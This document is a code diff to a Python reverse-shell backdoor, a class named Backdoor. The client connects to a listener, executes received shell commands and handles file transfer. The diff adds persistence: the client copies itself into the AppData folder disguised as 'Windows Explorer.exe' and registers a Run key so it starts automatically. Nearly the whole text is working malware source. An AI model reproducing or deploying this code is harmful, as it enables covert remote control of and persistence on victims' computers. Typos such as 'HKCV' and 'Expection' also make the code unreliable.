@@ -1,4 +1,4 @@
-#!/usr/bin/python2.7
+#!/usr/bin/python
 
 import socket
 import subprocess
@@ -6,17 +6,24 @@ import json
 import os
 import base64
 import sys
+import shutil
 
 class Backdoor:
 
 	def __init__(self,ip,port):
+		self.become_persistent()
 		self.connection=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
 		self.connection.connect(("localhost",1234))
+		
+	def become_persistent(self):
+		evil_file_location = os.environ["appdata"] + "\\Windows Explorer.exe"
+		if not os.path.exists(evil_file_location):
+			shutil.copyfile(sys.executable,evil_file_location)
+			subprocess.call('reg add HKCV\Software\Microsoft\Windows\CurrentVersion\Run /v name /t REG_SZ /d "' + evil_file_location +'"',shell=True)
 
 	def reliable_send(self,data):
 		json_data = json.dumps(data)
 		self.connection.send(json_data)
-
 
 	def reliable_receive(self):
 		json_data = ""
@@ -27,10 +34,8 @@ class Backdoor:
 			except ValueError:
 				continue
 
-
 	def execute_system_commmand(self,command):
 		return subprocess.check_output(command,shell=True)
-
 
 	def change_working_directory_to(self,path):
 		os.chdir(path)
@@ -48,11 +53,10 @@ class Backdoor:
 	def run(self):
 		while True:
 			command = self.reliable_receive()
-
 			try:
 				if command[0] == "exit":
 					self.connection.close()
-					sys.exit()
+					exit()
 				elif command[0] == "cd" and len(command) > 1:
 					command_result = self.change_working_directory_to(command[1])
 				elif command[0] == "download":
@@ -65,9 +69,12 @@ class Backdoor:
 
 			except Exception:
 				command_result = "[-] Error during command Execution"
-
 			self.reliable_send(command_result)
 
 
-my_backdoor = Backdoor("localhost",1234)
-my_backdoor.run()
+try:
+	my_backdoor = Backdoor("localhost",1234)
+	my_backdoor.run()
+
+except Expection:
+	sys.exit()
